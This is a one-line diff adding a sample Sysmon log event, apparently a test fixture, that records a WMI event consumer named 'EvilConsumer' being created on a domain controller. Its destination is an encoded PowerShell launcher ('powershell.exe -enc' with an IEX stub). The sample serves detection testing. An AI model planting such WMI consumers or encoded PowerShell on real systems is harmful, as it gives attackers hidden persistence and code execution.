@@ -1,0 +1,1 @@
+{"Event": {"System": {"EventID": 20, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "DC01"}, "EventData": {"Operation": "Created", "Consumer": "EvilConsumer", "Destination": "powershell.exe -enc SQBFAFgA"}}}
